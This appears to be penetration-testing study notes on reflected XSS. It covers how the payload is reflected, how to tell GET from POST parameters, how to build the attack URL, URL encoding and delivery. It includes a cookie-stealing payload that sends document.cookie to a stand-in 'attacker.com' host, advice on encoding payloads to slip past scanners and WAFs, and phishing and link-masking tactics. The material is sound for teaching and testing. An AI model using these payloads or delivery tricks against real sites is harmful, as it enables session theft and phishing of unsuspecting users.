# Reflected XSS

Reflected XSS is a non-persistent injection where the payload travels in the HTTP request, gets processed by the server, and is immediately included in the response without being stored. The vulnerability exists only for the duration of that single request/response cycle.

***

## How It Differs from Stored XSS

| Aspect | Stored XSS | Reflected XSS |
|--------|-----------|--------------|
| Payload location | Database | URL or request parameter |
| Persistence | Survives page refresh | Gone after navigating away |
| Victims | All page visitors automatically | Only users who receive and click the crafted URL |
| Attacker effort after injection | None | Must deliver crafted link to each victim |
| Severity | Critical | High |

***

## How It Works

The payload travels in a GET or POST parameter, the server reflects it back inside the HTML response (typically inside an error message or confirmation), and the browser executes it. The key difference from stored XSS is that the page source confirms it was reflected without ever being written to a database:

```html
<!-- Server response includes the raw payload back in the page -->
<div style="padding-left:25px">
  Task '<script>alert(window.origin)</script>' could not be added.
</div>
```

The browser renders the surrounding HTML normally but executes the injected `<script>` tag. The single quotes in the error message appear empty (`Task '' could not be added.`) because the rendered script tag is invisible to the user, while the JavaScript executes in the background.

Refreshing the page without the payload in the URL produces a clean page with no error message, confirming this is non-persistent.

***

## Confirming the Request Type

Before crafting the attack URL, confirm whether the vulnerable parameter is sent via GET or POST using browser DevTools (F12 > Network tab):

- **GET request**: Parameters are in the URL, making the attack as simple as sharing a link
- **POST request**: Parameters are in the request body, requiring a hosted HTML page with a form that auto-submits, significantly increasing delivery complexity

GET-based reflected XSS is far more common and easier to weaponise.

***

## Crafting the Attack URL

For a GET-based vulnerability, the full attack payload is visible in the browser URL bar after triggering the XSS:

```
http://target.com/index.php?task=<script>alert(window.origin)</script>
```

This URL is the complete attack vector. Any victim who clicks it will have the JavaScript execute in their browser under the target site's origin.

For real exploitation, the payload is replaced with something that exfiltrates data:

```
http://target.com/index.php?task=<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```

***

## URL Encoding Considerations

Raw angle brackets and special characters in URLs may be blocked by browsers, link previews, or WAFs. URL-encoding the payload makes it less readable to automatic scanners and passes URL validation checks:

```
# Raw
http://target.com/?task=<script>alert(1)</script>

# URL-encoded
http://target.com/?task=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```

Both forms deliver the same payload to the server. Most browsers handle either form, and the server decodes the URL-encoded version before inserting it into the response.

***

## Delivering the Reflected XSS Payload

Because reflected XSS requires each victim to visit the crafted URL, delivery method determines how many users are affected:

- **Phishing email**: Embed the URL as a "click here" link with a convincing pretext
- **Social engineering**: Share the link in chat platforms, forums, or social media with context that makes clicking appear legitimate
- **URL shorteners**: Mask the obvious payload in the URL so it does not raise suspicion on preview
- **Open redirect chains**: Some applications have open redirects that can be used to make the malicious URL appear to come from a trusted domain

The trust relationship is the core of the attack. The victim sees a URL pointing to a domain they recognise and trust, which is exactly why reflected XSS is effective despite requiring individual delivery. The malicious content appears to originate from the legitimate site, not from the attacker.
